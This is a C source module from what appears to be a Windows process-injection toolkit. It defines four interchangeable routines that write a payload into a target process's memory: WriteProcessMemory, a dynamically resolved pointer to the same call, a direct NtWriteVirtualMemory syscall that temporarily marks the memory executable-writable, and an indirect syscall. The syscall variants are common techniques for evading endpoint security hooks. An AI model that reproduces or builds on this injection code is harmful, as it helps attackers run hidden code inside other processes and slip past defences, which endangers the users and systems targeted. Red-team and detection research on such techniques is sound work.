#include "write.h"
#include "resolver.h"
#include "engine.h"
#include "protect.h"
#include "dispatch.h"

BOOL Win32Write(PINJECTION_CONTEXT ctx, LPCVOID payload)
{
    if (ctx->hProcess == (HANDLE)-1)
    {
        __try {
            memcpy(ctx->pRemoteAddress, payload, ctx->payloadSize);
            return TRUE;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return FALSE;
        }
    }

    return WriteProcessMemory(ctx->hProcess,
                              ctx->pRemoteAddress,
                              (PVOID)payload,
                              ctx->payloadSize,
                              NULL);
}

BOOL DFRWrite(PINJECTION_CONTEXT ctx, LPCVOID payload)
{
    if (ctx->hProcess == (HANDLE)-1)
    {
        __try {
            memcpy(ctx->pRemoteAddress, payload, ctx->payloadSize);
            return TRUE;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return FALSE;
        }
    }

    if (!g_WriteProcessMemory)
        return FALSE;

    return g_WriteProcessMemory(ctx->hProcess,
                                ctx->pRemoteAddress,
                                (PVOID)payload,
                                ctx->payloadSize,
                                NULL);
}

BOOL DirectWrite(PINJECTION_CONTEXT ctx, LPCVOID payload)
{
    if (ctx->hProcess == (HANDLE)-1)
    {
        __try {
            memcpy(ctx->pRemoteAddress, payload, ctx->payloadSize);
            return TRUE;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return FALSE;
        }
    }

    ULONG oldProt = 0;
    DispatchProtect(ctx, PAGE_EXECUTE_READWRITE, &oldProt);

    SIZE_T bytesWritten = 0;
    NTSTATUS status = SysNtWriteVirtualMemory(ctx->hProcess,
                                              ctx->pRemoteAddress,
                                              (PVOID)payload,
                                              ctx->payloadSize,
                                              &bytesWritten);

    DispatchProtect(ctx, oldProt, &oldProt);

    return (status == 0 && bytesWritten > 0);
}

BOOL IndirectWrite(PINJECTION_CONTEXT ctx, LPCVOID payload)
{
    if (ctx->hProcess == (HANDLE)-1)
    {
        __try {
            memcpy(ctx->pRemoteAddress, payload, ctx->payloadSize);
            return TRUE;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return FALSE;
        }
    }

    SIZE_T bytesWritten = 0;

    NTSTATUS status = IndirectSysNtWriteVirtualMemory(ctx->hProcess,
                                                      ctx->pRemoteAddress,
                                                      (PVOID)payload,
                                                      ctx->payloadSize,
                                                      &bytesWritten);

    return (status == 0 && bytesWritten > 0);
}